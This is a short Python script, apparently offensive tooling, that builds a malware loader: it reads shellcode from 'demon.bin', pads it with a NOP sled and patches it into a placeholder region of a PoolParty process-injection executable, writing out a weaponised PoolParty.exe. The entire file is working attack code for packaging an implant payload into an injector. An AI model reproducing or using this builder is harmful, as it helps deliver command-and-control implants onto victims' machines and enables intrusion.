#!/usr/bin/env python

import os


shellcode_file = "demon.bin"
shellcode = open(shellcode_file, "rb").read()

cwd = os.getcwd()
poolparty = open(f"{cwd}/PoolParty/PoolParty-master.exe", "rb").read()
nops = 200000 - len(shellcode)
#new_pp = poolparty.replace(b"A"*200000, b"B"*200000)
new_pp = poolparty.replace(b"A"*200000, b'\x90'*nops + shellcode)

open("PoolParty.exe", "wb").write(new_pp)